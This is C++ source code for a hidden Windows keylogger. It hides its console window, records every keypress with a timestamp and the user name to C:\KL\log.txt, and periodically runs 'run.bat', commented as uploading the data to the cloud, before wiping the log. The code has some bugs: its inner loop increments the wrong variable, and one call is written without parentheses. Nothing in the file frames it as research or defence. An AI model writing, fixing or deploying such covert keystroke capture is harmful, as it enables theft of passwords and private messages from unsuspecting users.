#include <iostream>
#include <ctime>
#include <stdio.h>
#include <windows.h>
#include <Lmcons.h>
#define FILE_NAME "C:\\KL\\log.txt" 


using namespace std;



int main() {

    FreeConsole;
    ShowWindow(GetConsoleWindow(), SW_HIDE); // Hide console
    system("run.bat"); // upload data to cloud
    FILE* file = fopen(FILE_NAME, "w"); // Declares new file to be written that stores temporary data
    
    unsigned char ch;

    while (true) { // keep application always running
        for ( ch = 0; ch <= 255; ch++) {  // Only accepts those keys thata are accepted by ASCII
            for (int i = 0; i <= 5000; ch++) // Loops until 5000 entries are reached
            {

                if (i == 5000)
                {
                    if (GetAsyncKeyState(ch) == -32767) // Iteration number 5000 to export data from log.txt
                    {
                        file = fopen(FILE_NAME, "a");
                        time_t now = time(nullptr);
                        TCHAR username[UNLEN + 1];
                        DWORD username_len = UNLEN + 1;
                        GetUserName(username, &username_len);
                        HKL KeyboardLayout = 0;
                        KeyboardLayout = GetKeyboardLayout(0);
                        fwprintf(file, L"%d %jd %s uuid\n", ch, (intmax_t)now, username);
                        fclose(file);
                        i++;
                        ShowWindow(GetConsoleWindow(), SW_HIDE);
                        system("run.bat");
                        FILE* file = fopen(FILE_NAME, "w"); //clears previous log.txt and creates a new empty one
                    }
                }
                else
                {
                    if (GetAsyncKeyState(ch) == -32767)
                    {
                        file = fopen(FILE_NAME, "a"); //append the wxisting log.txt
                        time_t now = time(nullptr); // gets timestamp
                        TCHAR username [UNLEN + 1]; // Gets machine name
                        DWORD username_len = UNLEN + 1;
                        GetUserName(username, &username_len);
                        HKL KeyboardLayout = 0; // Gets keyboard language
                        KeyboardLayout = GetKeyboardLayout(0);
                        fwprintf(file, L"%d %jd %s uuid\n", ch, (intmax_t)now, username); // writes values to log.txt
                        fclose(file);
                        i++;
                    }
                }
            }
        }
    }
    return 0;
}
